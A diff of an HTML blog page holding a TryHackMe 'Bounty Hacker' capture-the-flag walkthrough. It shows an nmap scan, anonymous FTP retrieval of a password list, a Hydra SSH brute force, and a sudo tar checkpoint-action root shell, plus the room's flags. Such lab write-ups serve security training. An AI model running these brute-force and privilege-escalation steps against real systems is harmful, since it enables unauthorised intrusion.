@@ -4,15 +4,13 @@
 <meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
 <meta name=robots content="index, follow">
 <title>Bounty-Hacker -Tryhackme | As-Blog</title><meta name=keywords content="CTF">
-<meta name=description content="Bounty Hacker -Tryhackme
+<meta name=description content="Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker
 Summary
-Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
-Machine link
-https://tryhackme.com/room/cowboyhacker
+Bounty hacker is a Tryhackme machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
 Scanning
 First, we need to find open ports on the machine
 Nmap scanning
-# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.">
+# Nmap 7.">
 <meta name=author content="Me">
 <link rel=canonical href=https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/>
 <meta name=google-site-verification content="XYZabc">
@@ -29,15 +27,13 @@ Nmap scanning
 <meta name=msapplication-TileColor content="#2e2e33">
 <noscript>
 <style>#theme-toggle,.top-link{display:none}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Bounty-Hacker -Tryhackme">
-<meta property="og:description" content="Bounty Hacker -Tryhackme
+<meta property="og:description" content="Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker
 Summary
-Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
-Machine link
-https://tryhackme.com/room/cowboyhacker
+Bounty hacker is a Tryhackme machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
 Scanning
 First, we need to find open ports on the machine
 Nmap scanning
-# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.">
+# Nmap 7.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"><meta property="og:image" content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts">
 <meta property="article:published_time" content="2022-01-19T00:00:00+00:00">
@@ -45,17 +41,15 @@ Nmap scanning
 <meta name=twitter:card content="summary_large_image">
 <meta name=twitter:image content="https://akhils911dev.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E">
 <meta name=twitter:title content="Bounty-Hacker -Tryhackme">
-<meta name=twitter:description content="Bounty Hacker -Tryhackme
+<meta name=twitter:description content="Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker
 Summary
-Bounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
-Machine link
-https://tryhackme.com/room/cowboyhacker
+Bounty hacker is a Tryhackme machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access
 Scanning
 First, we need to find open ports on the machine
 Nmap scanning
-# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.">
+# Nmap 7.">
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://akhils911dev.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Bounty-Hacker -Tryhackme","item":"https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bounty-Hacker -Tryhackme","name":"Bounty-Hacker -Tryhackme","description":"Bounty Hacker -Tryhackme\nSummary\nBounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nMachine link\nhttps://tryhackme.com/room/cowboyhacker\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.","keywords":["CTF"],"articleBody":"Bounty Hacker -Tryhackme\nSummary\nBounty hacker is a TryHackMe machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nMachine link\nhttps://tryhackme.com/room/cowboyhacker\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115 Nmap scan report for 10.10.168.115 Host is up (0.33s latency). Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.6.124.128 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP\nftp 10.10.168.115 Connected to 10.10.168.115. 220 (vsFTPd 3.0.3) Name (10.10.168.115:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt 226 Directory send OK. ftp get task.txt local: task.txt remote: task.txt  200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 100% |*******************************************| 68 299.12 KiB/s 00:00 ETA 226 Transfer complete. 68 bytes received in 00:00 (0.20 KiB/s) ftp ftp get locks.txt local: locks.txt remote: locks.txt 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 100% |*******************************************| 418 8.17 KiB/s 00:00 ETA 226 Transfer complete. 418 bytes received in 00:00 (1.08 KiB/s) ftp bye 221 Goodbye Here it has two files task.txt and locks.txt I get the file on my machine and let’s read both of the files to get the answer to who wrote the task list\n┌──(kali㉿kali)-[~/tryhackme/bugbounty] └─$ cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon.  -lin 1, Who wrote the task list?\nans \" lin “\ncat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 R3DDr46ONSYndIC@Te ReddRA60N R3dDrag0nSynd1c4te dRa6oN5YNDiCATE ReDDR4g0n5ynDIc4te R3Dr4gOn2044 RedDr4gonSynd1cat3 R3dDRaG0Nsynd1c@T3 Synd1c4teDr@g0n reddRAg0N REddRaG0N5yNdIc47e Dra6oN$yndIC@t3 4L1mi6H71StHeB357 rEDdragOn$ynd1c473 DrAgoN5ynD1cATE ReDdrag0n$ynd1cate Dr@gOn$yND1C4Te RedDr@gonSyn9ic47e REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N The locks.txt file has some strings it looks like passwords So now we can try brute forcing SSH with hydra taking the username lin and the password list locks.txt\n hydra -l lin -P locks.txt 10.10.168.115 ssh Hydra v9.2 (c) 2021 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 23:43:59 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task [DATA] attacking ssh://10.10.168.115:22/ [22][ssh] host: 10.10.168.115 login: lin password: RedDr4gonSynd1cat3 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 2 final worker threads did not complete until end. [ERROR] 2 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-14 23:44:08 after successful brute forcing we got the password for user lin which is RedDr4gonSynd1cat3\nit’s time to answer the next questions\n2, What service can you brute force with the text file found?\n” SSH “\n3, What is the user’s password?\n” RedDr4gonSynd1cat3 “\nGaining access\nNow, let’s access the machine through SSH using the recently obtained credentials\nssh lin@10.10.168.115 255 ⨯ The authenticity of host '10.10.168.115 (10.10.168.115)' can't be established. ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.168.115' (ED25519) to the list of known hosts. lin@10.10.168.115's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)   * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage  83 packages can be updated. 0 updates are security updates.  Last login: Sun Jun 7 22:23:41 2020 from 192.168.0.14 lin@bountyhacker:~/Desktop$ ls user.txt lin@bountyhacker:~/Desktop$ cat user.txt THM{CR1M3_SyNd1C4T3} user.txt THM{CR1M3_SyNd1C4T3}\nNow we got the user.txt flag and now we have to find root.txt, for that I checked the sudo permissions and found that tar I can run as root\nprivilege escalation\nlin@bountyhacker:~/Desktop$ sudo -l [sudo] password for lin: Matching Defaults entries for lin on bountyhacker:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User lin may run the following commands on bountyhacker:  (root) /bin/tar Check the GTFObins for tar Exploit which is a site GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, I got this\ncommand ” sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh “\nrun this command in the target machine shell it is greeted as root\nnow we are in root and got the root flag\nlin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh tar: Removing leading `/' from member names # whoami root # ls bin dev initrd.img lib64\tmnt root snap tmp\tvmlinuz boot etc initrd.img.old lost+found opt run srv usr\tvmlinuz.old cdrom home lib\tmedia\tproc sbin sys var # cd root # ls root.txt # cat root.txt THM{80UN7Y_h4cK3r} # Connection to 10.10.168.115 closed by remote host. Connection to 10.10.168.115 closed. root.txt THM{80UN7Y_h4cK3r}\nThank you for reading Happy Hacking\n","wordCount":"1058","inLanguage":"en","datePublished":"2022-01-19T00:00:00Z","dateModified":"2022-01-19T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"},"publisher":{"@type":"Organization","name":"As-Blog","logo":{"@type":"ImageObject","url":"https://akhils911dev.github.io/blog/favicon.ico"}}}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Bounty-Hacker -Tryhackme","name":"Bounty-Hacker -Tryhackme","description":"Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker\nSummary\nBounty hacker is a Tryhackme machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.","keywords":["CTF"],"articleBody":"Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker\nSummary\nBounty hacker is a Tryhackme machine that is super easy to do, we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access\nScanning\nFirst, we need to find open ports on the machine\nNmap scanning\n# Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115 Nmap scan report for 10.10.168.115 Host is up (0.33s latency). Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 | ftp-syst: | STAT: | FTP server status: | Connected to ::ffff:10.6.124.128 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 2 | vsFTPd 3.0.3 - secure, fast, stable |_End of status | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_Can't get directory listing: TIMEOUT 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA) | 256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA) |_ 256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Site doesn't have a title (text/html). |_http-server-header: Apache/2.4.18 (Ubuntu) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP\nftp 10.10.168.115 Connected to 10.10.168.115. 220 (vsFTPd 3.0.3) Name (10.10.168.115:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp ls 200 EPRT command successful. Consider using EPSV. 150 Here comes the directory listing. -rw-rw-r-- 1 ftp ftp 418 Jun 07 2020 locks.txt -rw-rw-r-- 1 ftp ftp 68 Jun 07 2020 task.txt 226 Directory send OK. ftp get task.txt local: task.txt remote: task.txt  200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for task.txt (68 bytes). 100% |*******************************************| 68 299.12 KiB/s 00:00 ETA 226 Transfer complete. 68 bytes received in 00:00 (0.20 KiB/s) ftp ftp get locks.txt local: locks.txt remote: locks.txt 200 EPRT command successful. Consider using EPSV. 150 Opening BINARY mode data connection for locks.txt (418 bytes). 100% |*******************************************| 418 8.17 KiB/s 00:00 ETA 226 Transfer complete. 418 bytes received in 00:00 (1.08 KiB/s) ftp bye 221 Goodbye Here it has two files task.txt and locks.txt I get the file on my machine and let’s read both of the files to get the answer to who wrote the task list\n┌──(kali㉿kali)-[~/tryhackme/bugbounty] └─$ cat task.txt 1.) Protect Vicious. 2.) Plan for Red Eye pickup on the moon.  -lin  1, Who wrote the task list?\n  ans \" lin \"\n cat locks.txt rEddrAGON ReDdr4g0nSynd!cat3 Dr@gOn$yn9icat3 R3DDr46ONSYndIC@Te ReddRA60N R3dDrag0nSynd1c4te dRa6oN5YNDiCATE ReDDR4g0n5ynDIc4te R3Dr4gOn2044 RedDr4gonSynd1cat3 R3dDRaG0Nsynd1c@T3 Synd1c4teDr@g0n reddRAg0N REddRaG0N5yNdIc47e Dra6oN$yndIC@t3 4L1mi6H71StHeB357 rEDdragOn$ynd1c473 DrAgoN5ynD1cATE ReDdrag0n$ynd1cate Dr@gOn$yND1C4Te RedDr@gonSyn9ic47e REd$yNdIc47e dr@goN5YNd1c@73 rEDdrAGOnSyNDiCat3 r3ddr@g0N The locks.txt file has some strings it looks like passwords So now we can try brute forcing SSH with hydra taking the username lin and the password list locks.txt\n hydra -l lin -P locks.txt 10.10.168.115 ssh Hydra v9.2 (c) 2021 by van Hauser/THC \u0026 David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-14 23:43:59 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task [DATA] attacking ssh://10.10.168.115:22/ [22][ssh] host: 10.10.168.115 login: lin password: RedDr4gonSynd1cat3 1 of 1 target successfully completed, 1 valid password found [WARNING] Writing restore file because 2 final worker threads did not complete until end. [ERROR] 2 targets did not resolve or could not be connected [ERROR] 0 target did not complete Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-01-14 23:44:08 after successful brute forcing we got the password for user lin which is RedDr4gonSynd1cat3\nit’s time to answer the next questions\n 2, What service can you brute force with the text file found?\n  SSH\n  3, What is the user’s password?\n  RedDr4gonSynd1cat3\n Gaining access\nNow, let’s access the machine through SSH using the recently obtained credentials\nssh lin@10.10.168.115 255 ⨯ The authenticity of host '10.10.168.115 (10.10.168.115)' can't be established. ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU. This key is not known by any other names Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added '10.10.168.115' (ED25519) to the list of known hosts. lin@10.10.168.115's password: Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)   * Documentation: https://help.ubuntu.com  * Management: https://landscape.canonical.com  * Support: https://ubuntu.com/advantage  83 packages can be updated. 0 updates are security updates.  Last login: Sun Jun 7 22:23:41 2020 from 192.168.0.14 lin@bountyhacker:~/Desktop$ ls user.txt lin@bountyhacker:~/Desktop$ cat user.txt THM{CR1M3_SyNd1C4T3} user.txt THM{CR1M3_SyNd1C4T3}\nNow we got the user.txt flag and now we have to find root.txt, for that I checked the sudo permissions and found that tar I can run as root\nPrivilege escalation\nlin@bountyhacker:~/Desktop$ sudo -l [sudo] password for lin: Matching Defaults entries for lin on bountyhacker:  env_reset, mail_badpass,  secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User lin may run the following commands on bountyhacker:  (root) /bin/tar Check the GTFObins for tar Exploit which is a site GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems, I got this\n command \" sudo tar -cf /dev/null /dev/null –checkpoint=1 –checkpoint-action=exec=/bin/sh “\n run this command in the target machine shell it is greeted as root\nnow we are in root and got the root flag\nlin@bountyhacker:/$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh tar: Removing leading `/' from member names # whoami root # ls bin dev initrd.img lib64\tmnt root snap tmp\tvmlinuz boot etc initrd.img.old lost+found opt run srv usr\tvmlinuz.old cdrom home lib\tmedia\tproc sbin sys var # cd root # ls root.txt # cat root.txt THM{80UN7Y_h4cK3r} # Connection to 10.10.168.115 closed by remote host. Connection to 10.10.168.115 closed. root.txt THM{80UN7Y_h4cK3r}\nThank you for reading Happy Hacking\n","wordCount":"1062","inLanguage":"en","datePublished":"2022-01-19T00:00:00Z","dateModified":"2022-01-19T00:00:00Z","author":{"@type":"Person","name":"Me"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://akhils911dev.github.io/blog/posts/tryhackme-bounty-hacker/"},"publisher":{"@type":"Organization","name":"As-Blog","logo":{"@type":"ImageObject","url":"https://akhils911dev.github.io/blog/favicon.ico"}}}</script>
 </head><body id=top>
 <script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add("dark")</script>
 <header class=header>
@@ -85,13 +79,13 @@ Nmap scanning
 <div class=breadcrumbs><a href=https://akhils911dev.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://akhils911dev.github.io/blog/posts/>Posts</a></div><h1 class=post-title>
 Bounty-Hacker -Tryhackme
 </h1><div class=post-meta><span title="2022-01-19 00:00:00 +0000 UTC">January 19, 2022</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/TryhackMe-Bounty-Hacker.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
-</div></header><div class=post-content><p>Bounty Hacker -Tryhackme</p><p><img loading=lazy src=/blog/posts/img/bounty.png alt="Test Image">
-</p><p><strong>Summary</strong></p><p>Bounty hacker is a <a href=https://tryhackme.com/><strong>TryHackMe</strong></a> machine that is super easy to do,
-we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access</p><p><strong>Machine link</strong></p><p><a href=https://tryhackme.com/room/cowboyhacker>https://tryhackme.com/room/cowboyhacker</a></p><p><strong>Scanning</strong></p><p>First, we need to find open ports on the machine<br>
-Nmap scanning</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115</span>
-</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.168.115
-</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.33s latency<span style=color:#f92672>)</span>.
-</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>967</span> filtered tcp ports <span style=color:#f92672>(</span>no-response<span style=color:#f92672>)</span>, <span style=color:#ae81ff>30</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
+</div></header><div class=post-content><p>Welcome to the another tryhackme walkthrough. This time we are looking at Bounty Hacker</p><p><img loading=lazy src=/blog/posts/img/bounty.png alt="Test Image">
+</p><p><strong>Summary</strong></p><p>Bounty hacker is a Tryhackme machine that is super easy to do,
+we got the FTP connection and got some credentials after that we access the machine with these credentials and exploit the Sudo permissions to got the root access</p><p><strong>Scanning</strong></p><p>First, we need to find open ports on the machine<br>
+Nmap scanning</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span># Nmap 7.92 scan initiated Fri Jan 14 23:24:07 2022 as: nmap -sCV -A -o scan.txt 10.10.168.115
+</span></span><span style=display:flex><span>Nmap scan report for 10.10.168.115
+</span></span><span style=display:flex><span>Host is up (0.33s latency).
+</span></span><span style=display:flex><span>Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
 </span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
 </span></span><span style=display:flex><span>21/tcp open  ftp     vsftpd 3.0.3
 </span></span><span style=display:flex><span>| ftp-syst: 
@@ -101,57 +95,57 @@ Nmap scanning</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;backgr
 </span></span><span style=display:flex><span>|      Logged in as ftp
 </span></span><span style=display:flex><span>|      TYPE: ASCII
 </span></span><span style=display:flex><span>|      No session bandwidth limit
-</span></span><span style=display:flex><span>|      Session timeout in seconds is <span style=color:#ae81ff>300</span>
+</span></span><span style=display:flex><span>|      Session timeout in seconds is 300
 </span></span><span style=display:flex><span>|      Control connection is plain text
 </span></span><span style=display:flex><span>|      Data connections will be plain text
-</span></span><span style=display:flex><span>|      At session startup, client count was <span style=color:#ae81ff>2</span>
+</span></span><span style=display:flex><span>|      At session startup, client count was 2
 </span></span><span style=display:flex><span>|      vsFTPd 3.0.3 - secure, fast, stable
 </span></span><span style=display:flex><span>|_End of status
-</span></span><span style=display:flex><span>| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span>|_Can<span style=color:#e6db74>&#39;t get directory listing: TIMEOUT
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>| ssh-hostkey: 
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-</span></span></span><span style=display:flex><span><span style=color:#e6db74>|_http-title: Site doesn&#39;</span>t have a title <span style=color:#f92672>(</span>text/html<span style=color:#f92672>)</span>.
-</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+</span></span><span style=display:flex><span>|_Can&#39;t get directory listing: TIMEOUT
+</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+</span></span><span style=display:flex><span>| ssh-hostkey: 
+</span></span><span style=display:flex><span>|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
+</span></span><span style=display:flex><span>|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
+</span></span><span style=display:flex><span>|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
+</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span style=display:flex><span>|_http-title: Site doesn&#39;t have a title (text/html).
+</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.18 (Ubuntu)
 </span></span><span style=display:flex><span>Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 </span></span><span style=display:flex><span>
 </span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds</span>
-</span></span></code></pre></div><p>The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ftp 10.10.168.115
+</span></span><span style=display:flex><span># Nmap done at Fri Jan 14 23:25:06 2022 -- 1 IP address (1 host up) scanned in 58.73 seconds
+</span></span></code></pre></div><p>The machine has some open ports 80,21,22 why not connect using FTP with the target machine because anonymous login is allowed it means anyone can connect with the server using FTP</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>ftp 10.10.168.115
 </span></span><span style=display:flex><span>Connected to 10.10.168.115.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
-</span></span><span style=display:flex><span>Name <span style=color:#f92672>(</span>10.10.168.115:kali<span style=color:#f92672>)</span>: anonymous
-</span></span><span style=display:flex><span><span style=color:#ae81ff>230</span> Login successful.
+</span></span><span style=display:flex><span>220 (vsFTPd 3.0.3)
+</span></span><span style=display:flex><span>Name (10.10.168.115:kali): anonymous
+</span></span><span style=display:flex><span>230 Login successful.
 </span></span><span style=display:flex><span>Remote system type is UNIX.
 </span></span><span style=display:flex><span>Using binary mode to transfer files.
 </span></span><span style=display:flex><span>ftp&gt; ls
-</span></span><span style=display:flex><span><span style=color:#ae81ff>200</span> EPRT command successful. Consider using EPSV.
-</span></span><span style=display:flex><span><span style=color:#ae81ff>150</span> Here comes the directory listing.
-</span></span><span style=display:flex><span>-rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>418</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> locks.txt
-</span></span><span style=display:flex><span>-rw-rw-r--    <span style=color:#ae81ff>1</span> ftp      ftp            <span style=color:#ae81ff>68</span> Jun <span style=color:#ae81ff>07</span>  <span style=color:#ae81ff>2020</span> task.txt
